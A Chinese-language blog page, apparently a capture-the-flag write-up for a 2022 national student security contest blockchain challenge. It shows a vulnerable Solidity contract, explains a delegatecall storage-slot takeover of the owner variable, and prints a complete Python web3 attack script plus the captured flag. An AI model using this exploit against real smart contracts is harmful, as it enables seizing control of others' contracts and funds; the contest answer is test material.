@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/bcYng-w/images/main/32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/bcYng-w/images/main/16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"bcyng-w.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":4},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="周日打了一下2022国赛的区块链题目，拿出来分享一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022第十五届全国大学生信息安全竞赛">
+<meta property="og:url" content="http://bcyng-w.github.io/2022/05/30/2022%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/index.html">
+<meta property="og:site_name" content="until">
+<meta property="og:description" content="周日打了一下2022国赛的区块链题目，拿出来分享一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/bcyng-image/image/raw/master/img/202205301743076.png">
+<meta property="article:published_time" content="2022-05-30T09:49:55.917Z">
+<meta property="article:modified_time" content="2022-05-30T09:47:54.076Z">
+<meta property="article:author" content="bcYng">
+<meta property="article:tag" content="区块链">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/bcyng-image/image/raw/master/img/202205301743076.png">
+
+<link rel="canonical" href="http://bcyng-w.github.io/2022/05/30/2022%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2022第十五届全国大学生信息安全竞赛 | until</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">until</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://bcyng-w.github.io/2022/05/30/2022%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/bcYng-w/images/main/touxaing.png">
+      <meta itemprop="name" content="bcYng">
+      <meta itemprop="description" content="前程似锦">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="until">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022第十五届全国大学生信息安全竞赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-30 17:49:55 / 修改时间：17:47:54" itemprop="dateCreated datePublished" datetime="2022-05-30T17:49:55+08:00">2022-05-30</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 周日打了一下2022国赛的区块链题目，拿出来分享一下</p>
+<span id="more"></span>
+
+<h1 id="1-Code"><a href="#1-Code" class="headerlink" title="1.Code"></a>1.Code</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.26;</span><br><span class="line"></span><br><span class="line">contract Lib &#123;</span><br><span class="line">    uint public score;</span><br><span class="line"></span><br><span class="line">    function setScore(uint _score) public &#123;</span><br><span class="line">        score = _score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> pragma solidity ^0.4.26;</span><br><span class="line"></span><br><span class="line">contract HackMe &#123;</span><br><span class="line">    address public lib;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public score;</span><br><span class="line"></span><br><span class="line">    constructor(address _lib) public payable&#123;</span><br><span class="line">        lib = _lib;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setScore(uint _score) public &#123;</span><br><span class="line">        (bool res, ) = lib.delegatecall(abi.encodeWithSignature(&quot;setScore(uint256)&quot;, _score));</span><br><span class="line">        require(res, &quot;Failed to delegatecall to lib&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目要求：owner值发生改变即可</p>
+<h1 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h1><p>漏洞是比较基础的delegatecall漏洞，<strong>就是调用外部代码，执行环境却是在本合约</strong>，详情参考我之前写过的基础漏洞汇总，链接：<a href="https://bcyng-w.github.io/2022/04/10/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#more">https://bcyng-w.github.io/2022/04/10/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#more</a></p>
+<p>调用两次setscore，第一次将lib转变为攻击合约，第二次调用攻击合约下的setscore修改对应slot1的值即可改变Hackme下owner的值。</p>
+<p>该题解锁钱包的方式比较特别，随机生成的账户没有私钥，而是用生成账户时的密码进行解锁账户，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41907714/article/details/106640274">https://blog.csdn.net/qq_41907714/article/details/106640274</a></p>
+<p><img src="https://gitee.com/bcyng-image/image/raw/master/img/202205301743076.png" alt="image-20220530153119652"></p>
+<p>我在这里设置的密码是123</p>
+<p>使用的解锁方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w3.geth.personal.unlockAccount(<span class="string">&#x27;0x0D7c2FB2B185e6633FC027eE2A37138661934026&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h1><p>最后附上攻击脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3,HTTPProvider</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">w3=Web3(HTTPProvider(<span class="string">&#x27;http://47.104.106.8:8545&#x27;</span>))</span><br><span class="line">hacksabi=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;_score&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;setScore&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;_lib&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;lib&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;owner&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;score&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hackersabi=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;_score&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;setScore&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;score&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">res=w3.geth.personal.unlockAccount(<span class="string">&#x27;0x0D7c2FB2B185e6633FC027eE2A37138661934026&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">account=w3.toChecksumAddress(<span class="string">&#x27;0x0D7c2FB2B185e6633FC027eE2A37138661934026&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(w3.eth.getBalance(account))</span><br><span class="line">hachsaddress=<span class="string">&#x27;0x73d7c98126aaC3e9dd5f4c4957a07fB05f5e8EB2&#x27;</span></span><br><span class="line">hackscontract=w3.eth.contract(abi=hacksabi,address=hachsaddress)</span><br><span class="line">code=<span class="string">&#x27;608060405234801561001057600080fd5b5060dc8061001f6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063422beeba14604e578063efedc669146078575b600080fd5b348015605957600080fd5b5060766004803603810190808035906020019092919050505060a0565b005b348015608357600080fd5b50608a60aa565b6040518082815260200191505060405180910390f35b8060018190555050565b600154815600a165627a7a72305820282edb4b675a8fb6d0eb1ab79325fc438b3ae4f8c9b27a3ad1690ef7704b531e0029&#x27;</span></span><br><span class="line">hackerscontract=w3.eth.contract(abi=hackersabi,bytecode=code)</span><br><span class="line"><span class="comment"># constructor_txn=hackerscontract.constructor().buildTransaction(&#123;</span></span><br><span class="line"><span class="comment">#     &#x27;from&#x27;: account,</span></span><br><span class="line"><span class="comment">#     &#x27;gas&#x27;: 1000000</span></span><br><span class="line"><span class="comment">#     &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tx_id=w3.eth.sendTransaction(constructor_txn)</span></span><br><span class="line"><span class="comment"># print(tx_id.hex())</span></span><br><span class="line"><span class="comment"># sleep(5)</span></span><br><span class="line"><span class="comment"># a=w3.eth.getTransactionReceipt(tx_id).contractAddress</span></span><br><span class="line"><span class="comment"># sleep(5)</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line">step1_txn=hackscontract.functions.setScore(<span class="number">0xBD6Ab56B2C74BDD3aBcf197af0Ff9e08F7F41a2D</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>:account,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">1000000</span></span><br><span class="line">    &#125;)</span><br><span class="line">tx_id1=w3.eth.sendTransaction(step1_txn)</span><br><span class="line"><span class="built_in">print</span>(tx_id1)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">step2_txn=hackscontract.functions.setScore(<span class="number">0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>:account,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">1000000</span></span><br><span class="line">    &#125;)</span><br><span class="line">tx_id2=w3.eth.sendTransaction(step2_txn)</span><br><span class="line"><span class="built_in">print</span>(tx_id2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>代码分段运行，先注释掉攻击部份，部署攻击合约，获得合约地址后作为攻击脚本的参数进行攻击，运行结束后，再cmd终端输入4检查攻击是否成功。</p>
+<p>获得flag：<strong>flag:{23d1eb0e-e1f5-4a86-b722-690135f0377a}</strong></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>bcYng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://bcyng-w.github.io/2022/05/30/2022%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="2022第十五届全国大学生信息安全竞赛">http://bcyng-w.github.io/2022/05/30/2022第十五届全国大学生信息安全竞赛/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag"># 区块链</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/09/Find-abnormal-transactions/" rel="prev" title="Find abnormal transactions">
+      <i class="fa fa-chevron-left"></i> Find abnormal transactions
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Code"><span class="nav-number">1.</span> <span class="nav-text">1.Code</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Analyze"><span class="nav-number">2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Attack"><span class="nav-number">3.</span> <span class="nav-text">Attack</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="bcYng"
+      src="https://raw.githubusercontent.com/bcYng-w/images/main/touxaing.png">
+  <p class="site-author-name" itemprop="name">bcYng</p>
+  <div class="site-description" itemprop="description">前程似锦</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/bcYng-w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;bcYng-w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=2384417651@qq.com" title="E-Mail → https:&#x2F;&#x2F;mail.qq.com&#x2F;cgi-bin&#x2F;qm_share?t&#x3D;qm_mailme&amp;email&#x3D;2384417651@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://kamasammohana.github.io/" title="https:&#x2F;&#x2F;kamasammohana.github.io&#x2F;" rel="noopener" target="_blank">kama's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lzhnb.site/" title="http:&#x2F;&#x2F;www.lzhnb.site&#x2F;" rel="noopener" target="_blank">scw's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://sycskye.xyz/" title="http:&#x2F;&#x2F;sycskye.xyz" rel="noopener" target="_blank">syc's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
